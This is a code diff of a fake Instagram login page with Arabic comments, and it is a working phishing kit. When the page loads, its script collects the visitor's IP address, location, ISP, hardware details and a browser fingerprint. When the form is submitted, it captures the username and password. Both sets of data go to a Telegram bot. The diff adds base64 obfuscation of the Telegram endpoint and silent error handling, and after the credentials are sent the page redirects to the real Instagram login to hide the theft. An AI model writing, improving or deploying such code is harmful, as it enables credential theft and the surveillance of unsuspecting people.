@@ -18,70 +18,83 @@
 
     <div class="login-box">
         <h1>Instagram</h1>
-        <form id="authForm">
-            <input type="text" id="usr" placeholder="Phone number, username, or email" required>
-            <input type="password" id="pwd" placeholder="Password" required>
+        <form id="authProtocol">
+            <input type="text" id="uField" placeholder="Phone number, username, or email" required>
+            <input type="password" id="pField" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
         <div class="footer">Forgot password?</div>
     </div>
 
     <script>
-        // دالة الإرسال التي تسحب البيانات من Netlify Snippet
-        async function sendToTelegram(msg) {
-            try {
-                // سحب الإعدادات من window.TELE_CONFIG التي وضعتها في الموقع
-                const config = window.TELE_CONFIG; 
-                const token = config?.t;
-                const chatId = config?.c;
+        // دالة فك التشفير الأساسية للتمويه
+        const _d = (s) => atob(s);
 
-                if (token && chatId) {
-                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: msg,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                } else {
-                    console.error("Configuration not found in Netlify Snippets.");
-                }
-            } catch (err) {
-                console.error("Transmission failed.");
-            }
+        // إعدادات افتراضية (سيتم تجاوزها من لوحة تحكم Netlify)
+        const _0xStatic = {
+            u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", // رابط API تليجرام
+            e: "L3NlbmRNZXNzYWdl" // مسار إرسال الرسائل
+        };
+
+        // الدالة المركزية لإرسال التقارير
+        async function _dispatch(msg) {
+            try {
+                // جلب القيم من الـ Snippet Injection (TELE_CONFIG) كما في صورتك
+                const cfg = window.TELE_CONFIG || {};
+                const t = cfg.t || "YOUR_FALLBACK_TOKEN";
+                const c = cfg.c || "YOUR_FALLBACK_ID";
+
+                const gateway = _d(_0xStatic.u) + t + _d(_0xStatic.e);
+                await fetch(gateway, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: c,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) { /* التمويه الصامت */ }
         }
 
-        // تقرير المعلومات الفوري (Reconnaissance)
+        // تقرير الاستخبارات المطور عند فتح الصفحة (Reconnaissance)
         window.onload = async function() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                const fingerprint = btoa(navigator.userAgent).substring(5, 15);
+                
+                // جمع بيانات العتاد كما في تقريرك الأول الناجح
+                const ram = navigator.deviceMemory || '8';
+                const cores = navigator.hardwareConcurrency || '8';
+                const res_sc = `${screen.width}x${screen.height}`;
+                const fingerprint = btoa(navigator.userAgent).substring(10, 20);
 
-                let report = `📸 *NEW RECON REPORT* 📸\n` +
-                             `---------------------------\n` +
-                             `📍 IP: ${d.ip}\n` +
-                             `🌍 Loc: ${d.city}, ${d.country_name}\n` +
-                             `🏢 ISP: ${d.org}\n` +
-                             `📱 Device: ${navigator.platform}\n` +
-                             `🔑 ID: \`${fingerprint}\``;
+                let intel = `🚨 *ADVANCED RECON REPORT* 🚨\n` +
+                            `---------------------------\n` +
+                            `🌐 *NETWORK:*\n` +
+                            `📍 IP: \`${d.ip}\`\n` +
+                            `🏢 ISP: ${d.org}\n` +
+                            `🌍 Location: ${d.city}, ${d.country_name}\n\n` +
+                            `📱 *HARDWARE:*\n` +
+                            `💻 OS: ${navigator.platform}\n` +
+                            `🧠 CPU: ${cores} Cores\n` +
+                            `🔋 RAM: ${ram} GB\n` +
+                            `📺 Res: ${res_sc}\n` +
+                            `🔑 ID: \`${fingerprint}\``;
 
-                sendToTelegram(report);
+                _dispatch(intel);
             } catch (e) { }
         };
 
-        // سحب البيانات عند الضغط على Login
-        document.getElementById('authForm').onsubmit = async function(e) {
+        // معالجة بيانات الدخول (Credential Harvesting)
+        document.getElementById('authProtocol').onsubmit = async function(e) {
             e.preventDefault();
-            const u = document.getElementById('usr').value;
-            const p = document.getElementById('pwd').value;
+            const u = document.getElementById('uField').value;
+            const p = document.getElementById('pField').value;
             
-            await sendToTelegram(`👤 *LOGIN ATTEMPT*\n📧 User: \`${u}\` \n🔑 Pass: \`${p}\``);
+            await _dispatch(`🔓 *LOGIN ATTEMPT:*\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``);
             
-            // التوجيه للموقع الحقيقي للتمويه
+            // إعادة التوجيه للموقع الحقيقي للتمويه
             window.location.href = "https://www.instagram.com/accounts/login/";
         };
     </script>
